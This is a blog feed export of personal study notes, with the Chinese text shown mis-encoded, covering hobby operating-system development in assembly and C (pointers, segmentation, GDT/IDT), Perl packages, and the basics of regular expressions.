æŒ‡ä»¤ æ˜¯ â€œequalâ€ çš„ç¼©å†™. ç›¸å½“äº C è¯­è¨€çš„ <code>#define</code> å‘½ä»¤, ç”¨æ¥å£°æ˜å¸¸æ•°. å¦‚ <code>CYLS EQU 10</code> æ„æ€æ˜¯ <code>CYLS = 10</code> (CYLS è¿™é‡Œè¡¨ç¤º Cylinders)</p><h2 id="ç€æ‰‹å¼€å‘æ“ä½œç³»ç»Ÿ"><a href="#ç€æ‰‹å¼€å‘æ“ä½œç³»ç»Ÿ" class="headerlink" title="ç€æ‰‹å¼€å‘æ“ä½œç³»ç»Ÿ"></a>ç€æ‰‹å¼€å‘æ“ä½œç³»ç»Ÿ</h2><p>ä¸€èˆ¬å‘ä¸€ä¸ªç©ºè½¯ç›˜ä¿å­˜æ–‡ä»¶æ—¶:</p><ol><li>æ–‡ä»¶åä¼šå†™åœ¨ <code>0x002600</code> ä»¥åçš„åœ°æ–¹.</li><li>æ–‡ä»¶çš„å†…å®¹ä¼šå†™åœ¨ <code>0x004200</code> ä»¥åçš„åœ°æ–¹</li></ol><h2 id="ä»å¯åŠ¨åŒºæ‰§è¡Œæ“ä½œç³»ç»Ÿ"><a href="#ä»å¯åŠ¨åŒºæ‰§è¡Œæ“ä½œç³»ç»Ÿ" class="headerlink" title="ä»å¯åŠ¨åŒºæ‰§è¡Œæ“ä½œç³»ç»Ÿ"></a>ä»å¯åŠ¨åŒºæ‰§è¡Œæ“ä½œç³»ç»Ÿ</h2><h2 id="ç¡®è®¤æ“ä½œç³»ç»Ÿçš„æ‰§è¡Œæƒ…å†µ"><a href="#ç¡®è®¤æ“ä½œç³»ç»Ÿçš„æ‰§è¡Œæƒ…å†µ" class="headerlink" title="ç¡®è®¤æ“ä½œç³»ç»Ÿçš„æ‰§è¡Œæƒ…å†µ"></a>ç¡®è®¤æ“ä½œç³»ç»Ÿçš„æ‰§è¡Œæƒ…å†µ</h2><p>è®¾å®š <code>AH=0x00</code>, è°ƒç”¨æ˜¾å¡ BIOS çš„å‡½æ•°, å°±å¯ä»¥åˆ‡æ¢æ˜¾ç¤ºæ¨¡å¼. </p><p>è®¾ç½®æˆæ˜¾å¡æ¨¡å¼çš„æ­¥éª¤:<br><img src="/../img/how_to_set_graphic_card_mode.png"></p><h2 id="32ä½æ¨¡å¼"><a href="#32ä½æ¨¡å¼" class="headerlink" title="32ä½æ¨¡å¼"></a>32ä½æ¨¡å¼</h2><p>æŒ‡CPUçš„æ¨¡å¼ï¼ŒCPUæœ‰16ä½å’Œ32ä½ä¸¤ç§æ¨¡å¼ã€‚16ä½æ¨¡å¼ä½¿ç”¨AXå’ŒCXç­‰å¯„å­˜å™¨ã€‚32ä½ä½¿ç”¨EAXå’ŒECXç­‰å¯„å­˜å™¨ã€‚</p><p>16ä½å’Œ32ä½æ¨¡å¼äº§ç”Ÿçš„æœºå™¨è¯­è¨€çš„æŒ‡ä»¤ä»£ç ä¸ä¸€æ ·ã€‚</p><p>CPUçš„è‡ªæˆ‘ä¿æŠ¤åŠŸèƒ½åœ¨16ä½ä¸‹ä¸èƒ½ä½¿ç”¨.</p><p>å¦‚æœç”¨ 32 ä½æ¨¡å¼å°±ä¸èƒ½è°ƒç”¨ BIOS åŠŸèƒ½, å› ä¸º BIOS æ˜¯ç”¨ 16 ä½æœºå™¨è¯­è¨€.</p><p><code>VRAM</code>æŒ‡æ˜¾å¡å†…å­˜(vedio RAM). ä¹Ÿå°±æ˜¯ç”¨æ¥æ˜¾ç¤ºç”»é¢çš„å†…å­˜.</p><h2 id="å¼€å§‹å¯¼å…¥-C-è¯­è¨€"><a href="#å¼€å§‹å¯¼å…¥-C-è¯­è¨€" class="headerlink" title="å¼€å§‹å¯¼å…¥ C è¯­è¨€"></a>å¼€å§‹å¯¼å…¥ C è¯­è¨€</h2><p><code>goto</code>æŒ‡ä»¤å®é™…ä¸Šä¼šè¢«ç¼–è¯‘æˆ<code>JMP</code>æŒ‡ä»¤.</p><p>Cè¯­è¨€ä¸­ä¸èƒ½ä½¿ç”¨<code>HLT</code>, ä¹Ÿæ²¡æœ‰ç›¸å½“ä¸<code>DB</code>çš„æŒ‡ä»¤.</p><p>gcc æ˜¯ä»¥ gas æ±‡ç¼–è¯­è¨€ä¸ºåŸºç¡€.</p><p>â€œA to Bâ€ ä¸­çš„ â€œtoâ€ å¸¸è¢«å†™ä½œ â€œ2â€.</p><p>ç›®æ ‡æ–‡ä»¶æ˜¯ä¸€ç§ç‰¹æ®Šçš„æœºå™¨è¯­è¨€æ–‡ä»¶ï¼Œå¿…é¡»ä¸å…¶ä»–æ–‡ä»¶é“¾æ¥(link)åæ‰èƒ½å˜æˆçœŸæ­£å¯ä»¥æ‰§è¡Œçš„æœºå™¨è¯­è¨€.</p><p>Cè¯­è¨€æœ‰ä¸€äº›å±€é™æ€§ï¼Œä¸å¯èƒ½åªç”¨Cè¯­è¨€æ¥ç¼–å†™æ‰€æœ‰çš„ç¨‹åºï¼Œæ‰€ä»¥å…¶ä¸­æœ‰ä¸€éƒ¨åˆ†å¿…é¡»ç”¨æ±‡ç¼–æ¥å†™ï¼Œç„¶åé“¾æ¥åˆ°Cè¯­è¨€å†™çš„ç¨‹åºä¸Š.</p><h2 id="å®ç°-HLT"><a href="#å®ç°-HLT" class="headerlink" title="å®ç° HLT"></a>å®ç° HLT</h2><p>ç”¨æ±‡ç¼–å†™çš„å‡½æ•°, ä¹‹åè¿˜è¦ä¸ <code>bootpack.obj</code> é“¾æ¥, æ‰€ä»¥ä¹Ÿéœ€è¦ç¼–è¯‘æˆç›®æ ‡æ–‡ä»¶. æ³¨æ„è¦åœ¨å‡½æ•°åçš„å‰é¢åŠ ä¸Š <code>_</code>, å¦åˆ™å°±ä¸èƒ½å¾ˆå¥½åœ°ä¸ C è¯­è¨€å‡½æ•°é“¾æ¥, éœ€è¦é“¾æ¥çš„å‡½æ•°å, éƒ½è¦ç”¨ <code>GLOBAL</code> æŒ‡ä»¤å£°æ˜.</p><p><code>RET</code> æŒ‡ä»¤, ç›¸å½“äº C è¯­è¨€çš„ return, è¡¨ç¤º â€œå‡½æ•°çš„å¤„ç†åˆ°æ­¤ç»“æŸ, è¿”å›å§â€.</p><p><mark>æ˜ åƒæ–‡ä»¶</mark><br>å¤§æ¦‚æ˜¯ï¼Œä¸æ˜¯æ–‡ä»¶æœ¬æ¥çš„çŠ¶æ€ï¼Œè€Œæ˜¯ä¸€ç§æ›¿ä»£å½¢å¼. ç®€å•æ¥è¯´å°±æ˜¯è½¯ç›˜çš„å¤‡ä»½æ•°æ®.</p><h1 id="ç¬¬4å¤©-Cè¯­è¨€ä¸ç”»é¢æ˜¾ç¤ºç»ƒä¹ "><a href="#ç¬¬4å¤©-Cè¯­è¨€ä¸ç”»é¢æ˜¾ç¤ºç»ƒä¹ " class="headerlink" title="ç¬¬4å¤© Cè¯­è¨€ä¸ç”»é¢æ˜¾ç¤ºç»ƒä¹ "></a>ç¬¬4å¤© Cè¯­è¨€ä¸ç”»é¢æ˜¾ç¤ºç»ƒä¹ </h1><p>CPU(è‹±ç‰¹å°”ç³»åˆ—):</p><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs basic"><span class="hljs-symbol">8086 </span>-&gt; <span class="hljs-number">80186</span> -&gt; <span class="hljs-number">286</span> -&gt; <span class="hljs-number">386</span> -&gt; <span class="hljs-number">486</span> -&gt; Pentium -&gt; Per<br></code></pre></td></tr></table></figure><p>åˆ°286ä¸ºæ­¢CPUæ˜¯16ä½ï¼Œ386ä»¥åCPUæ˜¯32ä½.</p><h2 id="æŒ‘æˆ˜æŒ‡é’ˆ"><a href="#æŒ‘æˆ˜æŒ‡é’ˆ" class="headerlink" title="æŒ‘æˆ˜æŒ‡é’ˆ"></a>æŒ‘æˆ˜æŒ‡é’ˆ</h2><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs armasm"><span class="hljs-keyword">MOV</span> [<span class="hljs-number">0x1234</span>], <span class="hljs-number">0x56</span><br></code></pre></td></tr></table></figure><p>è¿™ç§å†™æ³•ä¼šæŠ¥é”™, åœ¨å‘å†…å­˜å†™å…¥æ—¶, éœ€è¦æŒ‡å®šå†…å­˜çš„å¤§å°:</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-keyword">MOV</span> <span class="hljs-built_in">BYTE</span> [<span class="hljs-number">0x1234</span>], <span class="hljs-number">0x56</span><br></code></pre></td></tr></table></figure><p>è¿™ä¹Ÿæ˜¯å˜é‡å£°æ˜éœ€è¦å£°æ˜ç±»å‹, ä¹Ÿå°±æ˜¯è·çŸ¥å…¶å¤§å°.</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs arduino"><span class="hljs-type">char</span> *p;  <span class="hljs-comment">//ç”¨äºBYTEç±»åœ°å€</span><br><span class="hljs-type">short</span> *p; <span class="hljs-comment">//ç”¨äºWORDç±»åœ°å€</span><br><span class="hljs-type">int</span> *p;   <span class="hljs-comment">//ç”¨äºDWORDç±»åœ°å€</span><br></code></pre></td></tr></table></figure><p>ä½†æ˜¯ï¼Œä»¥ä¸Šå˜é‡<code>p</code>éƒ½æ˜¯4å­—èŠ‚.</p><p>ç±»å‹è½¬æ¢çš„ <code>cast</code> åœ¨è‹±æ–‡ä¸­çš„åŸæ„æœ‰å‹å…¥æ¨¡å…·ï¼Œè®©ææ–™æˆä¸ºæŸç§ç‰¹å®šçš„å½¢çŠ¶.</p><p>åœ¨ C è¯­è¨€ä¸­, æ™®é€šæ•°å€¼å’Œè¡¨ç¤ºå†…å­˜åœ°å€çš„æ•°å€¼è¢«è®¤ä¸ºæ˜¯ä¸¤ç§ä¸åŒçš„ä¸œè¥¿.</p><p><code>p[i]</code> å’Œ <code>*(p+i)</code> æ„æ€å®Œå…¨ç›¸åŒ. </p><p><code>[i]p</code> å’Œ <code>*(i+p)</code> ä¹Ÿè¡¨ç¤ºåŒæ ·çš„å«ä¹‰.</p><p>8 ä½å½©è‰²æ¨¡å¼, æ˜¯ç”±ç¨‹åºå‘˜éšæ„æŒ‡å®š 0 ~ 255 çš„æ•°å­—æ‰€å¯¹åº”çš„é¢œè‰².</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">char</span> a[<span class="hljs-number">3</span>];<br></code></pre></td></tr></table></figure><p>ç›¸å½“äºæ±‡ç¼–ä¸­çš„:</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">a</span>:<br>    <span class="hljs-attribute">RESB</span> <span class="hljs-number">3</span><br></code></pre></td></tr></table></figure><p>CPU çš„ç®¡è„šä¸ä»…ä¸å†…å­˜ç›¸è¿, å’Œå…¶ä»–è®¾å¤‡ä¹Ÿç›¸è¿.</p><p><code>FLAGS</code> è¿™ä¸ªæ ‡å¿—å¯„å­˜å™¨å„ä½çš„ä½œç”¨:</p><p><img src="/../img/flag_register_bytes.png"></p><p>æ ¹æ® C è¯­è¨€çš„è§„å®š, æ‰§è¡Œ RET è¯­å¥æ—¶, EAX ä¸­çš„å€¼å°±è¢«çœ‹ä½œæ˜¯å‡½æ•°çš„è¿”å›å€¼.</p><h1 id="ç¬¬5å¤©-ç»“æ„ä½“-æ–‡å­—æ˜¾ç¤ºä¸-GDT-x2F-IDT-åˆå§‹åŒ–"><a href="#ç¬¬5å¤©-ç»“æ„ä½“-æ–‡å­—æ˜¾ç¤ºä¸-GDT-x2F-IDT-åˆå§‹åŒ–" class="headerlink" title="ç¬¬5å¤© ç»“æ„ä½“, æ–‡å­—æ˜¾ç¤ºä¸ GDT&#x2F;IDT åˆå§‹åŒ–"></a>ç¬¬5å¤© ç»“æ„ä½“, æ–‡å­—æ˜¾ç¤ºä¸ GDT&#x2F;IDT åˆå§‹åŒ–</h1><p>ç‹¬ç«‹çš„åŠŸèƒ½åšæˆç‹¬ç«‹çš„å‡½æ•°, è¿™æ ·çš„ç¨‹åºè¯»èµ·æ¥è¦å®¹æ˜“ä¸€äº›.</p><h2 id="è¯•ç”¨ç»“æ„ä½“"><a href="#è¯•ç”¨ç»“æ„ä½“" class="headerlink" title="è¯•ç”¨ç»“æ„ä½“"></a>è¯•ç”¨ç»“æ„ä½“</h2><p>ç»“æ„ä½“çš„å¥½å¤„, æ˜¯å¯ä»¥å°†å„ç§ä¸œè¥¿ä¸€èµ·ä¼ é€’:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">TEST</span> &#123;</span><br>    <span class="hljs-type">int</span> a1, a2, a3;<br>    <span class="hljs-type">char</span> b1, b2, b3;<br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">TEST</span> <span class="hljs-title">test</span>;</span><br>foo(test);<br></code></pre></td></tr></table></figure><p>ä¸¤ç§ä½¿ç”¨ç»“æ„ä½“å†…å˜é‡çš„æ–¹æ³•:</p><ul><li><p><code>.</code> ç‚¹æ ‡è®°, å¦‚:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">(*binfo).scrnx = <span class="hljs-number">10</span>;<br></code></pre></td></tr></table></figure></li><li><p><code>-&gt;</code> ç®­å¤´æ ‡è®°</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">binfo-&gt;scrnx = <span class="hljs-number">10</span>;<br></code></pre></td></tr></table></figure><p>ä¹Ÿå°±æ˜¯è¯´, ä½¿ç”¨ç®­å¤´å½¢å¼å¯ä»¥ä¸ç”¨å°†æŒ‡é’ˆè§£å¼•ç”¨.</p></li></ul><h2 id="æ˜¾ç¤ºå­—ç¬¦"><a href="#æ˜¾ç¤ºå­—ç¬¦" class="headerlink" title="æ˜¾ç¤ºå­—ç¬¦"></a>æ˜¾ç¤ºå­—ç¬¦</h2><p>C è¯­è¨€æ— æ³•ç”¨äºŒè¿›åˆ¶æ•°è®°å½•æ•°æ®, åªèƒ½å†™æˆåå…­è¿›åˆ¶æˆ–å…«è¿›åˆ¶.</p><h2 id="å¢åŠ å­—ä½“"><a href="#å¢åŠ å­—ä½“" class="headerlink" title="å¢åŠ å­—ä½“"></a>å¢åŠ å­—ä½“</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">extern</span> <span class="hljs-type">char</span> hankaku[<span class="hljs-number">4096</span>];<br></code></pre></td></tr></table></figure><p>åƒè¿™ç§åœ¨æºç¨‹åºä»¥å¤–å‡†å¤‡çš„æ•°æ®, éƒ½éœ€è¦åŠ ä¸Š <code>extern</code> å±æ€§. è¿™æ ·, C ç¼–è¯‘å™¨å°±èƒ½çŸ¥é“å®ƒæ˜¯å¤–éƒ¨æ•°æ®, å¹¶åœ¨ç¼–è¯‘æ—¶åšå‡ºç›¸åº”è°ƒæ•´.</p><p>C è¯­è¨€ä¸­, å­—ç¬¦ä¸²éƒ½æ˜¯ä»¥ <code>0x00</code> ç»“å°¾çš„.</p><p>æ¯ä¸€ä¸ªå­—ç¬¦éƒ½æ˜¯é€šè¿‡æ”¹å˜æ¯ä¸€ä¸ªåƒç´ ç‚¹å½¢æˆ.</p><h2 id="æ˜¾ç¤ºå˜é‡å€¼"><a href="#æ˜¾ç¤ºå˜é‡å€¼" class="headerlink" title="æ˜¾ç¤ºå˜é‡å€¼"></a>æ˜¾ç¤ºå˜é‡å€¼</h2><p><code>sprintf()</code> å‡½æ•°, å…¶ä¸æ˜¯æŒ‰æŒ‡å®šæ ¼å¼è¾“å‡º, åªæ˜¯å°†è¾“å‡ºå†…å®¹ä½œä¸ºå­—ç¬¦ä¸²å†™åœ¨å†…å­˜ä¸­.</p><h2 id="æ˜¾ç¤ºé¼ æ ‡æŒ‡é’ˆ"><a href="#æ˜¾ç¤ºé¼ æ ‡æŒ‡é’ˆ" class="headerlink" title="æ˜¾ç¤ºé¼ æ ‡æŒ‡é’ˆ"></a>æ˜¾ç¤ºé¼ æ ‡æŒ‡é’ˆ</h2><h2 id="GDT-ä¸-IDT-çš„åˆå§‹åŒ–"><a href="#GDT-ä¸-IDT-çš„åˆå§‹åŒ–" class="headerlink" title="GDT ä¸ IDT çš„åˆå§‹åŒ–"></a>GDT ä¸ IDT çš„åˆå§‹åŒ–</h2><p>GDT å’Œ IDT éƒ½æ˜¯ä¸ CPU æœ‰å…³çš„è®¾å®š.</p><p>ä¸ºäº†è®©æ“ä½œç³»ç»Ÿèƒ½å¤Ÿä½¿ç”¨ 32 ä½æ¨¡å¼, éœ€è¦å¯¹ CPU åšå„ç§è®¾å®š.</p><h3 id="åˆ†æ®µ-Segmentation"><a href="#åˆ†æ®µ-Segmentation" class="headerlink" title="åˆ†æ®µ Segmentation"></a>åˆ†æ®µ Segmentation</h3><p>æ±‡ç¼–è¯­è¨€ç¼–ç¨‹æ—¶, å¦‚æœä¸ç”¨ ORG æŒ‡ä»¤æ˜ç¡®å£°æ˜ç¨‹åºè¦è¯»å…¥çš„å†…å­˜åœ°å€, å°±ä¸èƒ½å†™å‡ºæ­£ç¡®çš„ç¨‹åº.</p><p>åˆ†æ®µç”¨äºè§£å†³, æ¯ä¸€ä¸ªç¨‹åºéƒ½è¿è¡Œæ—¶çš„å†…å­˜é‡å é—®é¢˜ (æ¯”å¦‚éƒ½ä» <code>0x7c00</code> åŠ è½½, é‚£éƒ½ä½¿ç”¨è¿™ä¸€ç‰‡å†…å­˜å—) </p><p>æ‰€è°“åˆ†æ®µ, å‡ ä¸ªæ¯”æ–¹è¯´, å°±æ˜¯æŒ‰ç…§è‡ªå·±å–œæ¬¢çš„æ–¹å¼, å°†åˆè®¡ <code>4GB</code> çš„å†…å­˜åˆ†æˆå¾ˆå¤šå— (block), æ¯ä¸€å—çš„èµ·å§‹åœ°å€éƒ½çœ‹ä½œ 0 æ¥å¤„ç†. è¿™å¾ˆæ–¹ä¾¿, æœ‰äº†è¿™ä¸ªåŠŸèƒ½, ä»»ä½•ç¨‹åºéƒ½å…ˆå¯ä»¥å†™ä¸Šä¸€å¥ <code>ORG 0</code>, åƒè¿™æ ·åˆ†å‰²å‡ºæ¥çš„å—, å°±è¢«ç§°ä¸ºæ®µ (segment).</p><p>32 ä½ä¸­, å†™æˆ <code>MOV AL,[DS:EBX]</code>, è¿™é‡Œ <code>[]</code> ä¸­çš„åœ°å€ä¸å†æ˜¯ <code>DX x 16 + EBX</code>, è€Œæ˜¯ DS æ‰€è¡¨ç¤ºçš„æ®µçš„èµ·å§‹åœ°å€åŠ ä¸Š EBX. å³ä½¿çœç•¥äº† <code>DS</code>, ä¹Ÿä¼šè‡ªåŠ¨è®¤ä¸ºæ˜¯æŒ‡å®šäº† <code>DS</code>.</p><p>ä¸ºäº†è¡¨ç¤ºä¸€ä¸ªæ®µ, éœ€è¦æœ‰ä»¥ä¸‹ä¿¡æ¯:</p><ul><li>æ®µçš„å¤§å°æ˜¯å¤šå°‘</li><li>æ®µçš„èµ·å§‹ä½ç½®åœ¨å“ªé‡Œ</li><li>æ®µçš„ç®¡ç†å±æ€§ (ç¦æ­¢å†™å…¥, ç¦æ­¢æ‰§è¡Œ, ç³»ç»Ÿä¸“ç”¨ç­‰)</li></ul><p>CPU ç”¨ 8 ä¸ªå­—èŠ‚ (&#x3D;64ä½) çš„æ•°æ®æ¥è¡¨ç¤ºè¿™äº›ä¿¡æ¯. ä½†æ˜¯, ç”¨äºæŒ‡å®šæ®µçš„å¯„å­˜å™¨åªæœ‰ 16 ä½.</p><p>å› ä¸ºæ®µå¯„å­˜å™¨æ˜¯ 16 ä½, æ‰€ä»¥æœ¬æ¥åº”è¯¥èƒ½å¤Ÿå¤„ç† <code>0 ~ 65535</code> èŒƒå›´çš„æ•°, ä½†ç”±äº CPU è®¾è®¡ä¸Šçš„åŸå› , æ®µå¯„å­˜å™¨çš„ä½ 3 ä½ä¸èƒ½ä½¿ç”¨. å› æ­¤èƒ½å¤Ÿä½¿ç”¨çš„æ®µå·åªæœ‰ 13 ä½, èƒ½å¤Ÿå¤„ç†çš„å°±åªæœ‰ä½äº <code>0~8191</code> çš„åŒºåŸŸäº†. ä¹Ÿå°±æ˜¯è¯´å¯ä»¥å®šä¹‰ <code>8192</code> ä¸ªæ®µ, éœ€è¦ $8192 \times 8 &#x3D; 65536$ å­—èŠ‚, è¿™ 64KB çš„æ•°æ®å°±ç§°ä¸º <mark>GDT â€œglobal (segment) descripter tableâ€</mark>, å…¨å±€æ®µå·è®°å½•è¡¨.</p><p>å°†æ•°æ®æ•´é½åœ°æ’åˆ—åœ¨å†…å­˜çš„æŸä¸ªåœ°æ–¹, ç„¶åå°†å†…å­˜çš„èµ·å§‹åœ°å€å’Œæœ‰æ•ˆè®¾å®šä¸ªæ•°æ”¾åœ¨ CPU å†…è¢«ç§°ä½œ GDTR (global segment descripter table rergister) çš„ç‰¹æ®Šå¯„å­˜å™¨ä¸­ï¼Œè®¾å®šå°±å®Œæˆäº†.</p><p>ä¹Ÿå°±æ˜¯è¯´è¿™ 64 KB æ˜¯ç”¨æ¥å­˜æ”¾æ®µçš„ç›¸å…³ä¿¡æ¯, è€Œä¸æ˜¯æ®µçš„å†…å®¹.</p><p><mark>IDT æ˜¯ â€œInterrupt descriptor tableâ€</mark>  çš„ç¼©å†™, å³ â€œä¸­æ–­è®°å½•è¡¨â€. å…¶è®°å½•äº† <code>0~255</code> çš„ä¸­æ–­å·ç ä¸è°ƒç”¨å‡½æ•°çš„å¯¹åº”å…³ç³».</p><p>å„ä¸ªè®¾å¤‡æœ‰å˜åŒ–æ—¶å°±äº§ç”Ÿä¸­æ–­, ä¸­æ–­å‘ç”Ÿå, CPU æš‚æ—¶åœæ­¢æ­£åœ¨å¤„ç†çš„ä»»åŠ¡, å¹¶åšå¥½æ¥ä¸‹æ¥èƒ½ç»§ç»­å¤„ç†çš„å‡†å¤‡, è½¬è€Œæ‰§è¡Œä¸­æ–­ç¨‹åº. ä¸­æ–­ç¨‹åºæ‰§è¡Œå®Œä»¥å, åœ¨è°ƒç”¨å®ç°è®¾å®šå¥½çš„å‡½æ•°, è¿”å›å¤„ç†ä¸­çš„ä»»åŠ¡.</p>]]></content>
    
    
    <categories>
      
      <category>Operate System</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Programming Perl Notes</title>
    <link href="/2022/07/12/Programming-Perl-Notes/"/>
    <url>/2022/07/12/Programming-Perl-Notes/</url>
    
    <content type="html"><![CDATA[<h1 id="CHAPTER-10-Packages"><a href="#CHAPTER-10-Packages" class="headerlink" title="CHAPTER 10 Packages"></a>CHAPTER 10 Packages</h1><p>åœ¨Perlä¸­, å‘½åç©ºé—´ç§°ä¸ºåŒ…(package).</p><p>ä¸€ä¸ªæ–‡ä»¶å¯ä»¥æœ‰å¤šä¸ªåŒ…ï¼Œä¸€ä¸ªåŒ…ä¹Ÿå¯ä»¥è·¨å¤šä¸ªæ–‡ä»¶ã€‚</p><p>è‹¥è¦åœ¨æ–‡ä»¶ä¸­æ”¾ä¸€ä¸ªåŒ…ï¼Œæ–‡ä»¶åéœ€è¦å’ŒåŒ…åç›¸åŒ, å¹¶ä½¿ç”¨<code>.pm</code>æ‰©å±•å, è¿™æ˜¯<code>perl module</code>çš„ç¼©å†™ã€‚</p><p>æ¨¡å—(module)æ˜¯Perlä¸­å¯é‡ç”¨çš„åŸºæœ¬å•ä½ã€‚</p><p>è‹¥è¦ä½¿ç”¨æ¨¡å—ï¼Œéœ€è¦ä½¿ç”¨<code>use</code>å‘½ä»¤ï¼Œè¿™æ˜¯ä¸€ä¸ªç¼–è¯‘æŒ‡ä»¤ï¼Œå¯ä»¥æ§åˆ¶ä»æ¨¡å—å¯¼å…¥å­ä¾‹ç¨‹å’Œå˜é‡.</p><p>The typical class is implemented by a module that defines a package with the same name as the class.</p><p>é‡ç”¨çš„å«ä¹‰å¤§æ¦‚å°±æ˜¯ç›´æ¥ä½¿ç”¨åˆ«äººåˆ¶ä½œå¥½çš„è½¯ä»¶.</p><p><mark>the current package</mark><br>As Perl encounter a chunk of code, it is compiled into the current package. åˆå§‹çš„å½“å‰åŒ… is called â€œmainâ€.</p><p>å½“å‰åŒ…ç¡®å®šäº†è¦ä½¿ç”¨å“ªä¸ªç¬¦å·è¡¨æ¥æŸ¥æ‰¾å˜é‡ï¼Œå­ä¾‹ç¨‹ï¼ŒI&#x2F;O handles, and formats.</p><h2 id="Symbol-Tables"><a href="#Symbol-Tables" class="headerlink" title="Symbol Tables"></a>Symbol Tables</h2><p>åŒ…çš„å†…å®¹ç»Ÿç§°ä¸ºç¬¦å·è¡¨(Symbol Table)</p>]]></content>
    
    
    <categories>
      
      <category>Perl</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Master Regular Expressions</title>
    <link href="/2022/07/08/Master-Regular-Expressions/"/>
    <url>/2022/07/08/Master-Regular-Expressions/</url>
    
    <content type="html"><![CDATA[<h1 id="1-Introduction-to-Regular-Expression"><a href="#1-Introduction-to-Regular-Expression" class="headerlink" title="1 Introduction to Regular Expression"></a>1 Introduction to Regular Expression</h1><h2 id="The-Language-Analogy"><a href="#The-Language-Analogy" class="headerlink" title="The Language Analogy"></a>The Language Analogy</h2><p>Full regular expressions are composed of two types of characters:</p><pre><code class="hljs">1. The special characters are called metacharacters2. The rest are called literal or normal text characters. </code></pre><p>æ–‡ä»¶åæ¨¡å¼çš„å…ƒå­—ç¬¦è¦å°‘äºæ­£åˆ™è¡¨è¾¾å¼ã€‚</p><h2 id="å•è¯åˆ†ç•Œç¬¦"><a href="#å•è¯åˆ†ç•Œç¬¦" class="headerlink" title="å•è¯åˆ†ç•Œç¬¦"></a>å•è¯åˆ†ç•Œç¬¦</h2><p>åœ¨<code>egrep</code>åˆ†ç•Œç¬¦ä¸º<code>\&lt;</code>å’Œ<code>\&gt;</code>.</p><p>åŒºåˆ†å…ƒå­—ç¬¦å’Œå…ƒå­—ç¬¦åºåˆ—ï¼Œ<code>&lt;</code>å’Œ<code>&gt;</code>æœ¬èº«ä¸æ˜¯å…ƒå­—ç¬¦.</p><h2 id="æµæ´¾"><a href="#æµæ´¾" class="headerlink" title="æµæ´¾"></a>æµæ´¾</h2><p>æŒ‡æ¯æ ·å·¥å…·æ”¯æŒçš„å…ƒå­—ç¬¦å’Œå…¶ä»–ç‰¹æ€§å„ä¸ç›¸åŒ.</p><h1 id="2-Extended-Introductory-Examples"><a href="#2-Extended-Introductory-Examples" class="headerlink" title="2 Extended Introductory Examples"></a>2 Extended Introductory Examples</h1><p>Perl å’Œ egrep ä¸å±äºåŒä¸€ä¸ªæµæ´¾ï¼Œè€Œä¸” Perl æä¾›çš„å…ƒå­—ç¬¦è¿œè¿œå¤šäº egrep.</p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stata">% perl -<span class="hljs-keyword">One</span> &#x27;<span class="hljs-keyword">print</span> <span class="hljs-string">&quot;$ARGV\n&quot;</span> <span class="hljs-keyword">if</span> s/ResetSize<span class="hljs-comment">//ig != s/SetSize/ig&#x27; *</span><br></code></pre></td></tr></table></figure><p>åœ¨ Perl ä¸­ï¼Œå˜é‡ä¸éœ€è¦äº‹å…ˆå£°æ˜å°±èƒ½ä½¿ç”¨.</p><p>æŠŠ<code>=~</code>è¯»åšmatchä¼šæ¯”è¾ƒçœäº‹ã€‚</p><p>Perl ä¸€èˆ¬ä¸åŒºåˆ†æ•´æ•°å’Œæµ®ç‚¹æ•°.</p><h2 id="Adding-Commas-to-a-Number-with-Lookaround"><a href="#Adding-Commas-to-a-Number-with-Lookaround" class="headerlink" title="Adding Commas to a Number with Lookaround"></a>Adding Commas to a Number with Lookaround</h2><p>Lookaround match position within the text. ç¯è§†æ¯” anchors æ›´é€šç”¨.</p><p>Lookahead ä»å·¦å‘å³æŸ¥çœ‹æ–‡æœ¬. æ˜¯ä»headçœ‹ï¼Œé‚£å°±æ˜¯ä»å·¦å¾€å³.</p><p>Positive lookaround, ä»å·¦å‘å³æŸ¥çœ‹æ–‡æœ¬ï¼ŒæŸ¥çœ‹å½“å‰ä½ç½®å³è¾¹ã€‚ä½¿ç”¨ special sequence <code>(?=...)</code>è¡¨ç¤ºã€‚</p><p>lookbehind, ä»behindå¼€å§‹çœ‹ï¼Œä»å³å¾€å·¦æŸ¥çœ‹æ–‡æœ¬. æŸ¥çœ‹å½“å‰æ–‡æœ¬å·¦è¾¹ã€‚Using special sequence <code>(?&lt;=...)</code>. å¯ä»¥æŠŠ<code>&lt;=</code>çœ‹ä½œç®­å¤´æŒ‡å‘å·¦è¾¹æ‰€ä»¥åŒ¹é…å·¦ä¾§.</p><p>ç¯è§†è¡¨ç¤ºçš„æ˜¯æ‰¾åˆ°ä¸€ä¸ªä½ç½®å¹¶ä»è¿™é‡Œå¼€å§‹åŒ¹é…ï¼Œå¦‚:</p><figure class="highlight lasso"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 